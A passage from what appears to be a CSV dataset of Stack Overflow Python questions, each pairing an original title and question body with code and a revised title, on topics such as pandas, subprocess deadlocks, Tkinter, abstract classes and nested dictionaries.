""mary_id1"": ""c""}, {""employee"": ""bob"", ""gender"": ""male"", ""bob_id2"": ""b""}])df2 = df2.set_index(""employee"")df3 = pandas.DataFrame([{""employee"": ""mary"", ""gender"": ""female"", ""mary_id2"": ""d""}])df3 = df3.set_index(""employee"")merged = my_merge([df1, df2, df3], on=[""gender""])print ""MERGED: ""print merged",Combinatorial explosion while merging dataframes in pandas
IOError: [Errno 32] Broken pipe: Python," I have a very simple Python 3 script: But it always says: I saw on the internet all the complicated ways to fix this, but I copied this code directly, so I think that there is something wrong with the code and not Python's SIGPIPE.I am redirecting the output, so if the above script was named ""open.py"", then my command to run would be: <code>  f1 = open('a.txt', 'r')print(f1.readlines())f2 = open('b.txt', 'r')print(f2.readlines())f3 = open('c.txt', 'r')print(f3.readlines())f4 = open('d.txt', 'r')print(f4.readlines())f1.close()f2.close()f3.close()f4.close() IOError: [Errno 32] Broken pipe open.py | othercommand",IOError: [Errno 32] Broken pipe when piping: `prog.py | othercmd`
Jira with python," I am fairly new to the world of Python. Have just read some documents and want to get started. I want to design a tool written in Python to pick up issues from JIRA that have been marked as resolved by our QA team and then display a nice html report of the bug fixes going in per release basis. I am trying to understand mechanisms to connect to JIRA from Python but things are not getting cleared. I have installed : jira-python-lib but when I try and make a connection, I get errors. If I execute the code above, it gives me this error message: Can someone please tell me what I am doing wrong here?Also, I can't find any information at JIRA-DOC regarding automation. Can some one please guide to helpful documentation in this regard?Found out that I need to enable authentication enableBasicAuth in order to make this work. Need to try this. <code>  # /usr/bin/python from jira.client import JIRA jira_options={'server': 'https://xxxxxxxx.atlassian.net'} jira=JIRA(options=jira_options,basic_auth=('xxxxxxx','xxxxxx')) Traceback (most recent call last): File ""test1.py"", line 9, in <module> jira=JIRA(options=jira_options,basic_auth=('*****','****')) File ""C:\Python27\lib\site-packages\jira\client.py"", line 88, in __init__ self._create_http_basic_session(*basic_auth) File ""C:\Python27\lib\site-packages\jira\client.py"", line 1368, in _create_htt p_basic_session hooks={'args': self._add_content_type}) TypeError: session() takes no arguments (2 given)",JIRA with Python
Elegant way to test SSH availability in python," I need a Python program I'm using to poll a remote server for SSH connectivity and notify when it is available. I am currently doing this using paramiko; attempt to connect, if failure, wait and retry until success or max retries. This works, but it's a bit clunky. Also paramiko seems to either connect or throw an error, so the only way I could see to do this was with a try/except block which is bad, bad, bad. Here is the method: There must be a more elegant solution than this. Paramiko is my SSH library of choice but am open to any suggestions here.To clarify, I want to avoid using try / except as a means to control the normal flow of code execution - it should be used for catching actual errors such as bad host key, invalid user etc. <code>  def check_ssh(self, ip, user, key_file, initial_wait=0, interval=0, retries=1): ssh = paramiko.SSHClient() ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) sleep(initial_wait) for x in range(retries): try: ssh.connect(ip, username=user, key_filename=key_file) return True except Exception, e: print e sleep(interval) return False",Elegant way to test SSH availability
Issue with editing the csv using Python," I am using below referred code to edit a csv using Python. Functions called in the code form upper part of the code. Problem: I want the below referred code to start editing the csv from 2nd row, I want it to exclude 1st row which contains headers. Right now it is applying the functions on 1st row only and my header row is getting changed. I tried to solve this problem by initializing row variable to 1 but it didn't work.Please help me in solving this issue. <code>  in_file = open(""tmob_notcleaned.csv"", ""rb"")reader = csv.reader(in_file)out_file = open(""tmob_cleaned.csv"", ""wb"")writer = csv.writer(out_file)row = 1for row in reader: row[13] = handle_color(row[10])[1].replace("" - "","""").strip() row[10] = handle_color(row[10])[0].replace(""-"","""").replace(""("","""").replace("")"","""").strip() row[14] = handle_gb(row[10])[1].replace(""-"","""").replace("" "","""").replace(""GB"","""").strip() row[10] = handle_gb(row[10])[0].strip() row[9] = handle_oem(row[10])[1].replace(""Blackberry"",""RIM"").replace(""TMobile"",""T-Mobile"").strip() row[15] = handle_addon(row[10])[1].strip() row[10] = handle_addon(row[10])[0].replace("" by"","""").replace(""FREE"","""").strip() writer.writerow(row)in_file.close() out_file.close()",Skip the headers when editing a csv file using Python
Significance of -u option ?, I am noticed in some python code that -u is used to start the python interpreter. I looked at the man page for python but I could not get much out of it. Please give me some examples. <code> ,Python: significance of -u option?
Python: How to count how many lines in a file are the same," I have a text document in the format of: I want to have a program that counts how many lines have -1+1 lines and +1-1 lines. The program would then just need to return the value of how many lines are like this.I have written the code: But for some reason, it always returns 0 and I have no idea why. <code>  -1+1-1-1+1+1-1-1+1-1... f1 = open(""results.txt"", ""r"")fileOne = f1.readlines()f1.close()x = 0for i in fileOne: if i == '-1+1': x += 1 elif i == '+1-1': x += 1 else: continueprint x",How to count how many lines in a file are the same?
Function that returns a function?," In Python, I'd like to write a function make_cylinder_volume(r) which returns another function. That returned function should be callable with a parameter h, and return the volume of a cylinder with height h and radius r.I know how to return values from functions in Python, but how do I return another function? <code> ",How do I write a function that returns another function?
How to run celery as a deamon in production?, i created a celeryd file in /etc/defaults/ from the code here:https://github.com/celery/celery/blob/3.0/extra/generic-init.d/celerydNow when I want to run celeryd as a daemon and do this: sudo /etc/init.d/celerdy it says command not found. Where am I going wrong? <code> ,How to run celery as a daemon in production?
Extract information from gmail - Python," I have come through solutions to extract useful information from selected received emails in Gmail mailbox. Aim in this example is to fetch all mails sent from a newsletter providing monthly prices for petroleum. You can freely subscribe to such a newsletter on EIA website. All such newsletter arrive in same folder in my gmail mailbox, and begin with ""$"". Content for emails is like thatand my objective is to write a script that fetch the 10 last such emails (last 10 months) and plot petroleum prices for the different US regions with respect to time.  <code> ",Extract information from Gmail with Python
Event signal is emmitted twice," I am working on GUI appplication. From main window I open new popup window Dialog=myDialog()(so both are now open). If i press button on that new popup window, and catch signal with this code: I got this oouput12So, this method has been executed twice. How can i fix this problem?Same happens on every other signal emmitted on popup window <code>  class Ui_DialogCalibration(object):def setupUi(self, DialogCalibration): DialogCalibration.setObjectName(_fromUtf8(""DialogCalibration"")) DialogCalibration.resize(888, 378) self.widget = QtGui.QWidget(DialogCalibration) self.widget.setGeometry(QtCore.QRect(10, 150, 641, 144)) self.widget.setObjectName(_fromUtf8(""widget"")) self.horizontalLayout_5 = QtGui.QHBoxLayout(self.widget) self.horizontalLayout_5.setMargin(0) self.horizontalLayout_5.setObjectName(_fromUtf8(""horizontalLayout_5"")) self.radioButtonManual = QtGui.QRadioButton(self.widget) self.radioButtonManual.setObjectName(_fromUtf8(""radioButtonManual"")) self.horizontalLayout_5.addWidget(self.radioButtonManual) self.verticalLayout = QtGui.QVBoxLayout() self.verticalLayout.setObjectName(_fromUtf8(""verticalLayout"")) self.horizontalLayout_4 = QtGui.QHBoxLayout() self.horizontalLayout_4.setObjectName(_fromUtf8(""horizontalLayout_4"")) self.verticalLayout_4 = QtGui.QVBoxLayout() self.verticalLayout_4.setObjectName(_fromUtf8(""verticalLayout_4"")) self.pushButtonDesnoX = QtGui.QPushButton(self.widget) self.pushButtonDesnoX.setObjectName(_fromUtf8(""pushButtonDesnoX"")) self.verticalLayout_4.addWidget(self.pushButtonDesnoX) self.lineEdit = QtGui.QLineEdit(self.widget) self.lineEdit.setText(_fromUtf8("""")) self.lineEdit.setObjectName(_fromUtf8(""lineEdit"")) self.verticalLayout_4.addWidget(self.lineEdit) self.pushButtonLijevoX = QtGui.QPushButton(self.widget) self.pushButtonLijevoX.setObjectName(_fromUtf8(""pushButtonLijevoX"")) self.verticalLayout_4.addWidget(self.pushButtonLijevoX) self.horizontalLayout_4.addLayout(self.verticalLayout_4) self.verticalLayout_3 = QtGui.QVBoxLayout() self.verticalLayout_3.setObjectName(_fromUtf8(""verticalLayout_3"")) self.pushButtonDesnoY = QtGui.QPushButton(self.widget) self.pushButtonDesnoY.setObjectName(_fromUtf8(""pushButtonDesnoY"")) self.verticalLayout_3.addWidget(self.pushButtonDesnoY) self.lineEdit_2 = QtGui.QLineEdit(self.widget) self.lineEdit_2.setText(_fromUtf8("""")) self.lineEdit_2.setObjectName(_fromUtf8(""lineEdit_2"")) self.verticalLayout_3.addWidget(self.lineEdit_2) self.pushButtonLijevoY = QtGui.QPushButton(self.widget) self.pushButtonLijevoY.setObjectName(_fromUtf8(""pushButtonLijevoY"")) self.verticalLayout_3.addWidget(self.pushButtonLijevoY) self.horizontalLayout_4.addLayout(self.verticalLayout_3) self.verticalLayout_2 = QtGui.QVBoxLayout() self.verticalLayout_2.setObjectName(_fromUtf8(""verticalLayout_2"")) self.pushButtonDesnoZ = QtGui.QPushButton(self.widget) self.pushButtonDesnoZ.setObjectName(_fromUtf8(""pushButtonDesnoZ"")) self.verticalLayout_2.addWidget(self.pushButtonDesnoZ) self.lineEdit_3 = QtGui.QLineEdit(self.widget) self.lineEdit_3.setText(_fromUtf8("""")) self.lineEdit_3.setObjectName(_fromUtf8(""lineEdit_3"")) self.verticalLayout_2.addWidget(self.lineEdit_3) self.pushButtoLijevoZ = QtGui.QPushButton(self.widget) self.pushButtoLijevoZ.setObjectName(_fromUtf8(""pushButtoLijevoZ"")) self.verticalLayout_2.addWidget(self.pushButtoLijevoZ) self.horizontalLayout_4.addLayout(self.verticalLayout_2) self.verticalLayout.addLayout(self.horizontalLayout_4) self.pushButtonSondaSettings = QtGui.QPushButton(self.widget) self.pushButtonSondaSettings.setObjectName(_fromUtf8(""pushButtonSondaSettings"")) self.verticalLayout.addWidget(self.pushButtonSondaSettings) self.pushButtonReset = QtGui.QPushButton(self.widget) self.pushButtonReset.setObjectName(_fromUtf8(""pushButtonReset"")) self.verticalLayout.addWidget(self.pushButtonReset) self.horizontalLayout_5.addLayout(self.verticalLayout) self.verticalLayout_5 = QtGui.QVBoxLayout() self.verticalLayout_5.setObjectName(_fromUtf8(""verticalLayout_5"")) self.labelPozition = QtGui.QLabel(self.widget) self.labelPozition.setObjectName(_fromUtf8(""labelPozition"")) self.verticalLayout_5.addWidget(self.labelPozition) self.horizontalLayout = QtGui.QHBoxLayout() self.horizontalLayout.setObjectName(_fromUtf8(""horizontalLayout"")) self.labelpozitionX = QtGui.QLabel(self.widget) self.labelpozitionX.setObjectName(_fromUtf8(""labelpozitionX"")) self.horizontalLayout.addWidget(self.labelpozitionX) self.lineEditPozitionX = QtGui.QLineEdit(self.widget) self.lineEditPozitionX.setObjectName(_fromUtf8(""lineEditPozitionX"")) self.horizontalLayout.addWidget(self.lineEditPozitionX) self.verticalLayout_5.addLayout(self.horizontalLayout) self.horizontalLayout_2 = QtGui.QHBoxLayout() self.horizontalLayout_2.setObjectName(_fromUtf8(""horizontalLayout_2"")) self.labelPozitionY = QtGui.QLabel(self.widget) self.labelPozitionY.setObjectName(_fromUtf8(""labelPozitionY"")) self.horizontalLayout_2.addWidget(self.labelPozitionY) self.lineEditPozitionY = QtGui.QLineEdit(self.widget) self.lineEditPozitionY.setObjectName(_fromUtf8(""lineEditPozitionY"")) self.horizontalLayout_2.addWidget(self.lineEditPozitionY) self.verticalLayout_5.addLayout(self.horizontalLayout_2) self.horizontalLayout_3 = QtGui.QHBoxLayout() self.horizontalLayout_3.setObjectName(_fromUtf8(""horizontalLayout_3"")) self.labelPozitionZ = QtGui.QLabel(self.widget) self.labelPozitionZ.setObjectName(_fromUtf8(""labelPozitionZ"")) self.horizontalLayout_3.addWidget(self.labelPozitionZ) self.lineEditPozitionZ = QtGui.QLineEdit(self.widget) self.lineEditPozitionZ.setObjectName(_fromUtf8(""lineEditPozitionZ"")) self.horizontalLayout_3.addWidget(self.lineEditPozitionZ) self.verticalLayout_5.addLayout(self.horizontalLayout_3) self.horizontalLayout_5.addLayout(self.verticalLayout_5) self.widget1 = QtGui.QWidget(DialogCalibration) self.widget1.setGeometry(QtCore.QRect(20, 40, 631, 91)) self.widget1.setObjectName(_fromUtf8(""widget1"")) self.verticalLayout_6 = QtGui.QVBoxLayout(self.widget1) self.verticalLayout_6.setMargin(0) self.verticalLayout_6.setObjectName(_fromUtf8(""verticalLayout_6"")) self.radioButtonAutomatic = QtGui.QRadioButton(self.widget1) self.radioButtonAutomatic.setObjectName(_fromUtf8(""radioButtonAutomatic"")) self.verticalLayout_6.addWidget(self.radioButtonAutomatic) self.buttonBox = QtGui.QDialogButtonBox(self.widget1) self.buttonBox.setOrientation(QtCore.Qt.Horizontal) self.buttonBox.setStandardButtons(QtGui.QDialogButtonBox.Cancel|QtGui.QDialogButtonBox.Ok) self.buttonBox.setObjectName(_fromUtf8(""buttonBox"")) self.verticalLayout_6.addWidget(self.buttonBox) self.labelpozitionX.setBuddy(self.lineEditPozitionX) self.labelPozitionY.setBuddy(self.lineEditPozitionY) self.labelPozitionZ.setBuddy(self.lineEditPozitionZ) self.radioButtonManual.toggle() self.buttonBox.setEnabled(False) self.pushButtonDesnoX.setEnabled(False) self.pushButtonDesnoY.setEnabled(False) self.pushButtonDesnoZ.setEnabled(False) self.pushButtonLijevoX.setEnabled(False) self.pushButtonLijevoY.setEnabled(False) self.pushButtoLijevoZ.setEnabled(False) self.pushButtonReset.setEnabled(False) self.lineEdit.setText(""1"") self.lineEdit_2.setText(""1"") self.lineEdit_3.setText(""1"") self.X=None self.Y=None self.Z=None self.retranslateUi(DialogCalibration) QtCore.QObject.connect(self.buttonBox, QtCore.SIGNAL(_fromUtf8(""accepted()"")), DialogCalibration.accept) QtCore.QObject.connect(self.buttonBox, QtCore.SIGNAL(_fromUtf8(""rejected()"")), DialogCalibration.reject) QtCore.QMetaObject.connectSlotsByName(DialogCalibration) class myDialog(QtGui.QDialog,Ui_DialogCalibration):def __init__(self,sonda, parent=None): super(myDialog, self).__init__( parent) self.toupleSonda=sonda self.setupUi(self)def on_pushButtonDesnoX_clicked(self): value=int(self.lineEdit.text()) self.X=self.X+value print self.Xdef retranslateUi(self, DialogCalibration): DialogCalibration.setWindowTitle(QtGui.QApplication.translate(""DialogCalibration"", ""Calibration"", None, QtGui.QApplication.UnicodeUTF8)) self.radioButtonManual.setText(QtGui.QApplication.translate(""DialogCalibration"", ""manual"", None, QtGui.QApplication.UnicodeUTF8)) self.pushButtonDesnoX.setText(QtGui.QApplication.translate(""DialogCalibration"", ""Desno X"", None, QtGui.QApplication.UnicodeUTF8)) self.pushButtonLijevoX.setText(QtGui.QApplication.translate(""DialogCalibration"", ""Lijevo X"", None, QtGui.QApplication.UnicodeUTF8)) self.pushButtonDesnoY.setText(QtGui.QApplication.translate(""DialogCalibration"", ""Naprijed Y"", None, QtGui.QApplication.UnicodeUTF8)) self.pushButtonLijevoY.setText(QtGui.QApplication.translate(""DialogCalibration"", ""Nazad Y"", None, QtGui.QApplication.UnicodeUTF8)) self.pushButtonDesnoZ.setText(QtGui.QApplication.translate(""DialogCalibration"", ""Gore Z"", None, QtGui.QApplication.UnicodeUTF8)) self.pushButtoLijevoZ.setText(QtGui.QApplication.translate(""DialogCalibration"", ""Dolje Z"", None, QtGui.QApplication.UnicodeUTF8)) self.pushButtonSondaSettings.setText(QtGui.QApplication.translate(""DialogCalibration"", ""Load"", None, QtGui.QApplication.UnicodeUTF8)) self.pushButtonReset.setText(QtGui.QApplication.translate(""DialogCalibration"", ""Reset"", None, QtGui.QApplication.UnicodeUTF8)) self.labelPozition.setText(QtGui.QApplication.translate(""DialogCalibration"", ""Current pozition"", None, QtGui.QApplication.UnicodeUTF8)) self.labelpozitionX.setText(QtGui.QApplication.translate(""DialogCalibration"", ""X"", None, QtGui.QApplication.UnicodeUTF8)) self.labelPozitionY.setText(QtGui.QApplication.translate(""DialogCalibration"", ""Y"", None, QtGui.QApplication.UnicodeUTF8)) self.labelPozitionZ.setText(QtGui.QApplication.translate(""DialogCalibration"", ""Z"", None, QtGui.QApplication.UnicodeUTF8)) self.radioButtonAutomatic.setText(QtGui.QApplication.translate(""DialogCalibration"", ""automatic"", None, QtGui.QApplication.UnicodeUTF8))",Event signal is emmitted twice every time
Replacing part of sring in python pandas dataframe," I have a similar problem to the one posted here: Pandas DataFrame: remove unwanted parts from strings in a columnI need to remove newline characters from within a string in a DataFrame. Basically, I've accessed an api using python's json module and that's all ok. Creating the DataFrame works amazingly, too. However, when I want to finally output the end result into a csv, I get a bit stuck, because there are newlines that are creating false 'new rows' in the csv file.So basically I'm trying to turn this: '...this is a paragraph.And this is another paragraph...'into this:'...this is a paragraph. And this is another paragraph...'I don't care about preserving any kind of '\n' or any special symbols for the paragraph break. So it can be stripped right out.I've tried a few variations: here's another There is no error message, but the newline characters don't go away, either. Same thing with this: The write to csv line is this: Version of Pandas is 0.9.1Thanks! :) <code>  misc['product_desc'] = misc['product_desc'].strip('\n')AttributeError: 'Series' object has no attribute 'strip' misc['product_desc'] = misc['product_desc'].str.strip('\n')TypeError: wrapper() takes exactly 1 argument (2 given)misc['product_desc'] = misc['product_desc'].map(lambda x: x.strip('\n'))misc['product_desc'] = misc['product_desc'].map(lambda x: x.strip('\n\t')) misc = misc.replace('\n', '') misc_id.to_csv('C:\Users\jlalonde\Desktop\misc_w_id.csv', sep=' ', na_rep='', index=False, encoding='utf-8')",Replacing part of string in python pandas dataframe
Can a python function taking *args/**kwargs be called from C or another language space?," Take a canonical Python function defined like: Calling this function from Python might look like: Does the Python C API provide some way to call this function from C space? How can the above three lines be converted to C equivalent?Note that in a similar question, using boost::python, C++ calls into this keyword argument function with almost the same syntax as from Python, which is quite a trick! <code>  def foo(*args, **kwargs): print(""args:"", len(args)) for i in args: print(i) print(""kwargs:"", len(kwargs)) for k in kwargs: print(k, kwargs[k]) some_list = ['one', 'two', 'three']some_kwords = { ""name1"" : ""alice"", ""name2"" : ""bob"", ""name3"" : ""carol"" }foo(*some_list, **some_kwords)",Can a Python function taking *args/**kwargs be called from C or another language space?
Output dictionary value using **for-in** loop in Python," UpdateSomeone is probably going to drop the hammer on me for posting this way but there's not enough room in comments to cover this and they specifically tell you not to answer your own question with a follow-up, so here goes...I've created the dice class like you guys were talking about. The number argument isn't doing anything though. The only way I'm getting more than one die is if I do something like this: I've also tried: That looks redundant to me but I get a Type Error: for having too few arguments without dice(10, 2). No matter which method I use, I get the same result - one die. Am I missing something?Original postI'm learning how to use classes in Python 2.7 and as an exercise I'm writing a combat module for a text-based RPG. It uses the old school dice roll method to determine outcomes and effects. A roll determines a hit or miss. If a natural 20 is rolled, another roll determines if it was a critical hit. If critical hit = TRUE, another die is rolled to determined which body part is effected. Each body part is paired with a number 1-12 in a dictionary. There are three possible output messages depending on the affected part. My problem is that the entire list of values is returned instead of a specific part. What am I doing wrong here?Yes, I know this is super nerdy. Yes, I know the output is lame, but it's all place holder. <code>  class dice(): def __init__(self, sides, number): self.sides = sides self.number = number def roll(self): return random.randint(1, self.sides) def att(): d = dice(20, 2) base = d.roll() if base == 1: print 'Miss!' elif base == 20: crit = d.roll() if crit < 10: print 'Hit!' else: print 'Critical hit!\n' effect = super_crit() else: print base def initiative(): d = dice(10, 1) ini = d.roll(), d.roll() print ini def initiative(): d = dice(10, 2) d.sides = 10 d.number = 2 ini = d.roll() print ini import sys, random#dice generatorclass dice(): def d4(self): number = random.randint(1, 4) return number def d6(self): number = random.randint(1, 6) return number def d10(self): number = random.randint(0, 9) return number def d12(self): number = random.randint(1, 12) return number def d20(self): number = random.randint(1, 20) return number def d100(self): number = random.randint(0, 99) return number #critical hit effect generator class super_crit(dice): def __init__(self): roll = dice() loc = roll.d12() hit_loc = {1 : 'Head', 2 : 'Left Arm', 3 : 'Right Arm', 4 : 'Left Leg', 5 : 'Right Leg', 6 : 'Left Hand', 7 : 'Right Hand', 8 : 'Left Foot', 9 : 'Right Foot', 10 : 'Chest', 11 : 'Stomach', 12 : 'Body'} part = hit_loc.values() for w in part: if loc <= 9: print w, ""has been severed!"" elif loc == 10: print ""You sink your blade into his"", w, ""and pierce the heart!"" elif loc == 11: print ""You slash him across the"", w, ""and eviscerate him!"" elif loc == 12: print ""You shred the enemy's"", w, ""to ribbons!""class attackRoll(dice): pass#Attack function def att(): roll = attackRoll() base = roll.d20() if base == 1: print 'Miss!' elif base == 20: crit = roll.d20() if crit < 10: print 'Hit!' else: effect = super_crit() else: print basedef main(): att()if __name__ == '__main__':main()",Dice generator using class in Python
Check if a Python class is abstract or concrete," My Python application contains many abstract classes and implementations. For example: FriendlyMessagePrinter is a concrete class that we can use... ...but MessageDisplay and FriendlyMessageDisplay are abstract classes and attempting to instantiate one would result in an error: How can I check if a given class object is an (uninstantiatable) abstract class? <code>  import abcimport datetimeclass MessageDisplay(object): __metaclass__ = abc.ABCMeta @abc.abstractproperty def display(self, message): passclass FriendlyMessageDisplay(MessageDisplay): def greet(self): hour = datetime.datetime.now().timetuple().tm_hour if hour < 7: raise Exception(""Cannot greet while asleep."") elif hour < 12: self.display(""Good morning!"") elif hour < 18: self.display(""Good afternoon!"") elif hour < 20: self.display(""Good evening!"") else: self.display(""Good night."")class FriendlyMessagePrinter(FriendlyMessageDisplay): def display(self, message): print(message) FriendlyMessagePrinter().greet() Good night. TypeError: Can't instantiate abstract class MessageDisplay with abstract methods say",Determine if a Python class is an Abstract Base Class or Concrete
"Python, Tkinter - Inserting text into canvas windows"," I have a Tkinter canvas populated with text and canvas windows, or widgets, created using the create_text and create_window methods. The widgets I place on the canvas are text widgets, and I want to insert text into them after they are created and placed. I can't figure out how to do this, if it's even possible. I realise you can edit them after creation using canvas.itemconfig(tagOrId, cnf), but text can't be inserted that way. Is there a solution to this? <code> ",Tkinter - Inserting text into canvas windows
Python setup.py problems," I'm having troubles with installing packages in Python 3.I have always installed packages with setup.py install. But now, when I try to install the ansicolors package I get: I have no idea what to do because I didn't have setuptools installed in the past. Still, I was able to install many packages with setup.py install without setuptools. Why should I get setuptools now?I can't even install setuptools because I have Python 3.3 and setuptools doesn't support Python 3.Why doesn't my install command work anymore? <code>  importerror ""No Module named Setuptools""","Python 3: ImportError ""No Module named Setuptools"""
Understanding the syntax of numpy.r_," I read the following in the numpy documentation for the function r_: A string integer specifies which axis to stack multiple comma separated arrays along. A string of two comma-separated integers allows indication of the minimum number of dimensions to force each entry into as the second integer (the axis to concatenate along is still the first integer).and they give this example: I don't follow, what does exactly the string '0,2' instruct numpy to do? Other than the link above, is there another site with more documentation about this function? <code>  >>> np.r_['0,2', [1,2,3], [4,5,6]] # concatenate along first axis, dim>=2array([[1, 2, 3], [4, 5, 6]])",Understanding the syntax of numpy.r_() concatenation
Drop row in Panda Series and clean up index," I have a Pandas Series and based on a random number I want to pick a row (5 in the code example below) and drop that row. When the row is dropped I want to create a new index for the remaining rows (0 to 8). The code below: And this is the output: My problem is that the row number 8 is dropped. I want to drop row ""5 NaN"" and keep -0.000052 with an index 0 to 8. This is what I want it to look like: <code>  print 'Original series: ', sample_mean_seriesprint 'Length of original series', len(sample_mean_series)sample_mean_series = sample_mean_series.drop([5],axis=0)print 'Series with item 5 dropped: ', sample_mean_seriesprint 'Length of modified series:', len(sample_mean_series)print sample_mean_series.reindex(range(len(sample_mean_series))) Original series: 0 0.0000741 -0.0000672 0.0000763 -0.0000174 -0.0000385 -0.0000516 0.0001257 -0.0001088 -0.0000099 -0.000052Length of original series 10Series with item 5 dropped: 0 0.0000741 -0.0000672 0.0000763 -0.0000174 -0.0000386 0.0001257 -0.0001088 -0.0000099 -0.000052Length of modified series: 90 0.0000741 -0.0000672 0.0000763 -0.0000174 -0.0000385 NaN6 0.0001257 -0.0001088 -0.000009 0 0.0000741 -0.0000672 0.0000763 -0.0000174 -0.0000385 0.0001256 -0.0001087 -0.0000098 -0.000052",Drop row in Pandas Series and clean up index
string to time with decmial seconds," Say I have a string with format HHMMSS.SS how do I convert this to a time object?This is how I thought you would do it: However%S does not take take into account fractions of seconds according to the time documentation. <code>  import timetime.strptime(timestring, '%H%M%S')",string to time with decimal seconds
what do you mean by hashable in python, I tried searching internet but could not find the meaning of hashable.When they say objects are hashable or hashable objects what does it mean? <code> ,"What does ""hashable"" mean in Python?"
What do you mean by hashable in Python?, I tried searching internet but could not find the meaning of hashable.When they say objects are hashable or hashable objects what does it mean? <code> ,"What does ""hashable"" mean in Python?"
Python - Prime Factorization," I wrote an integer factorization function, but after messing around with it, I realized it had problems with a few numbers... What's wrong in my code? <code>  >>> pFactors(99) # it does work for numbers with multiple of one prime factor[3, 3, 11]>>> pFactors(999) # however, sometimes, it doesn't[3, 37] # the actual prime factorization of 999 is [3, 3, 3, 37]. >>> pFactors(88)[2, 11]>>> pFactors(888)[2, 3, 37] def pFactors(n): """"""Finds the prime factors of 'n'"""""" from primes import isPrime from math import sqrt pFact, limit, check, num = [], int(round(sqrt(n), 2)) + 1, 2, n if isPrime(n): return [n] for check in range(2, limit): if isPrime(check) and num % check == 0: pFact.append(check) num /= check if isPrime(num): pFact.append(num) break pFact = sorted(pFact) return pFact",Python - Integer Factorization into Primes
communicate deadlocks permanently when used with multiple Popen subprocesses," The following issue does not occur in Python 2.7.3. However, it occurs with both Python 2.7.1 and Python 2.6 on my machine (64-bit Mac OSX 10.7.3). This is code I will eventually distribute, so I would like to know if there is any way to complete this task that does not depend so dramatically on the Python version.I need to open multiple subprocesses in parallel and write STDIN data to each of them. Normally I would do this using the Popen.communicate method. However, communicate is deadlocking whenever I have multiple processes open at the same time. If I change the number of processes to for _ in range(1), the output is just as expected: However, when there are two processes (for _ in range(2)), the process blocks indefinitely. I've tried the alternative of writing to stdin manually: But then any attempt to read from the processes, (p.stdout.read(), for example) still deadlocks.At first this appears to be related, but it specifies that it occurs when multiple threads are being used, and that the deadlocking occurs only very infrequently (while here it always occurs). Is there any way to get this to work on versions of Python before 2.7.3? <code>  import subprocesscmd = [""grep"", ""hello""]processes = [subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) for _ in range(2)]for p in processes: print p.communicate(""hello world\ngoodbye world\n"") ('hello world\n', '') for p in processes: p.stdin.write(""hello world\ngoodbye world\n"")",Why does communicate deadlock when used with multiple Popen subprocesses?
Nose: How to skip Tests by default?," I am using Python's nose and I have marked some of my tests as ""slow"", as explained in the attrib plugin documentation.I would like to skip all ""slow"" Tests by default when running nosetests, i.e. without having to write nosetests -a '!slow'. But I want to be able to run these tests when explicitly running them or writing nosetests -a 'slow'.How can I achieve this? <code> ",Nose: How to skip tests by default?
Acces python nested dictionary items via a list of keys," I have a complex dictionary structure which I would like to access via a list of keys to address the correct item. or I have made the following code which works but I'm sure there is a better and more efficient way to do this if anyone has an idea. <code>  dataDict = { ""a"":{ ""r"": 1, ""s"": 2, ""t"": 3 }, ""b"":{ ""u"": 1, ""v"": { ""x"": 1, ""y"": 2, ""z"": 3 }, ""w"": 3 }} maplist = [""a"", ""r""] maplist = [""b"", ""v"", ""y""] # Get a given data from a dictionary with position provided as a listdef getFromDict(dataDict, mapList): for k in mapList: dataDict = dataDict[k] return dataDict# Set a given data in a dictionary with position provided as a listdef setInDict(dataDict, mapList, value): for k in mapList[:-1]: dataDict = dataDict[k] dataDict[mapList[-1]] = value",Access nested dictionary items via a list of keys?
Access python nested dictionary items via a list of keys," I have a complex dictionary structure which I would like to access via a list of keys to address the correct item. or I have made the following code which works but I'm sure there is a better and more efficient way to do this if anyone has an idea. <code>  dataDict = { ""a"":{ ""r"": 1, ""s"": 2, ""t"": 3 }, ""b"":{ ""u"": 1, ""v"": { ""x"": 1, ""y"": 2, ""z"": 3 }, ""w"": 3 }} maplist = [""a"", ""r""] maplist = [""b"", ""v"", ""y""] # Get a given data from a dictionary with position provided as a listdef getFromDict(dataDict, mapList): for k in mapList: dataDict = dataDict[k] return dataDict# Set a given data in a dictionary with position provided as a listdef setInDict(dataDict, mapList, value): for k in mapList[:-1]: dataDict = dataDict[k] dataDict[mapList[-1]] = value",Access nested dictionary items via a list of keys?
Django overwriting modelform save causes recursion," I'm overwriting the save method of a ModelForm and I don't know why it would cause recursion: Causes this: Stacktrace shows this line repetitively calling itself: Now, the parsley decorator is like this: As @DanielRoseman suggested that the Parsley decorator extending the AccountForm causes the super(AccountForm,self) to keep calling itself, what's the solution?Also I cannot get my head around this why this would cause recursion. <code>  @parsleyfyclass AccountForm(forms.ModelForm): def save(self, *args, **kwargs): # some other code... return super(AccountForm, self).save(*args,**kwargs) maximum recursion depth exceeded while calling a Python object return super(AccountForm, self).save(*args,**kwargs) def parsleyfy(klass): class ParsleyClass(klass): # some code here to add more stuff to the class return ParsleyClass",Python class decorator extending class causes recursion
should we always specify an exception type in Python?, When using PyCharm IDE the use of except: without an exception type triggers a reminder from the IDE that this exception clause is Too broad. Should I be ignoring this advice? Or is it Pythonic to always specific the exception type? <code> ,Should I always specify an exception type in `except` statements?
python NameError: name is not defined," I have a python script and I am receiving the following error: Here is the code that causes the problem: This is being run with Python 3.3.0 under Windows 7 x86-64.Why can't the Something class be found? <code>  Traceback (most recent call last): File ""C:\Users\Tim\Desktop\pop-erp\test.py"", line 1, in <module> s = Something() NameError: name 'Something' is not defined s = Something()s.out()class Something: def out(): print(""it works"")",Python NameError: name is not defined
Python: elegant way to delete None values from Python dict," I have a dictionary as: I wish to eliminate the empty values as: I wrote a function (following an example found on the web) I have the following questions:1- I didn't find the mistake why it always returns following - 2- Is there a built-in function to eliminate/delete Null/None/empty values from Python dictionary without creating a copy of the original dictionary? <code>  default = {'a': ['alpha'], 'b': ['beta','gamma'], 'g': []} default = {'a': ['alpha'], 'b': ['beta','gamma']} def remove_empty_keys(d): for k in d.keys(): try: if len(d[k]) < 1: del[k] except: pass return(d) remove_empty_keys(default) {'a': ['alpha'], 'b': ['beta'], 'g': []}",Python: An elegant way to delete empty lists from Python dictionary
